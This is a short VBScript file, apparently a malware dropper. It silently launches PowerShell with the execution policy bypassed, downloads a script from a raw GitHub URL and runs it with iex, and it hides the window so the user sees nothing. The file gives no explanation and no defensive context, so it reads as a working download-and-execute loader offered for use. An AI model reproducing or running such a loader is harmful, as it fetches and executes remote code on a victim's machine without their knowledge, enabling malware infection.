Set WshShell3 = CreateObject("WScript.Shell")
WshShell3.Run "powershell.exe -Sta -NoExit -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command ""$p=(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/GremlinStyle/tools/main/fool/test.ps1');$p=$p+';echo HO;';iex $p""", 0, False
Set WshShell3 = Nothing